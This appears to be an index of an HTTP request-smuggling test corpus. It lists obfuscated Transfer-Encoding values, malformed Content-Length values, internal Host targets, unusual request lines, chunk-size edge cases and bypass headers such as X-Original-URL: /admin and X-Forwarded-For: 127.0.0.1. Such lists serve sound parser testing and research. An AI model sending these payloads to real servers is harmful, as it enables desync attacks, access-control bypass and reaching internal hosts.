# Desync corpus — the extended ambiguity set

## The `Connection` variants — the shared-socket controls

```text
Connection: keep-alive        — the shared socket
Connection: close             — no desync
Connection: Upgrade           — the tunnel
Connection: Upgrade, HTTP2-Settings   — h2c
Connection: keep-alive, Upgrade       — both
```

`queue-management.md` / `tunneling.md`.

## The `Transfer-Encoding` variants — the obfuscation set

```text
Transfer-Encoding: chunked
Transfer-Encoding: cow
Transfer-Encoding: identity
Transfer-Encoding: chunked,identity
Transfer-Encoding: chunked,chunked
Transfer-Encoding: chunked;
Transfer-Encoding: chunked 
Transfer-Encoding:  chunked
Transfer-Encoding : chunked
Transfer-Encoding:\tchunked
Transfer-Encoding: chunked\t
Transfer-Encoding: xchunked
Transfer-Encoding: chunkedx
Transfer-Encoding: "chunked"
Transfer-Encoding: chunked chunked
Transfer_Encoding: chunked
TE: chunked
Transfer-Encoding: chu\x00nked
Transfer-Encoding:\r\n chunked
Transfer-Encoding: cow\r\n chunked
```

`obfuscation.md`.

## The `Content-Length` variants — the numeric set

```text
Content-Length: 4
Content-Length: 4a
Content-Length: 0x10
Content-Length: +4
Content-Length: -1
Content-Length: 4.0
Content-Length:  4
Content-Length:4
Content-Length:\t4
Content-Length: 9999999999
Content_Length: 4
X-Content-Length: 4
Content-Length: 4
Content-Length: 7
```

`cl-manipulation.md`.

## The `Host:` variants — the vhost set

```text
Host: a
Host: b
Host: internal
Host: internal:9000
Host: localhost
Host: 127.0.0.1
Host: sub.internal
Host: t:9000
Host: (missing)
```

`virtual-host.md`.

## The request-line variants — the method/path/version

```text
GET / HTTP/1.1
get / HTTP/1.1
GPOST / HTTP/1.1
OPTIONS * HTTP/1.1
GET http://internal/path HTTP/1.1
CONNECT internal:80 HTTP/1.1
GET / HTTP/1.1 
POST / HTTP/1.0
POST / HTTP/0.9
```

`method-boundary.md` / `protocol-version.md`.

## The header-name variants — the synonyms

```text
Content-Length: 4
Content_Length: 4
X-Content-Length: 4
Transfer-Encoding: chunked
Transfer_Encoding: chunked
TE: chunked
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-HTTP-Method-Override: PUT
X-Original-Method: DELETE
```

`header-smuggling.md` / `advanced-headers.md`.

## The line-ending variants — the `\r\n` vs `\n`

```text
\r\n    — the standard
\n      — LF only
\r      — CR only
\r\n \r\n — obs-fold
```

`parser-quirks.md`.

## The chunk variants — the size-field

```text
5c
5c;ext=x
005c
-1
ffffffff
5c\n
5c\t\r\n
```

`chunked-encoding.md`.
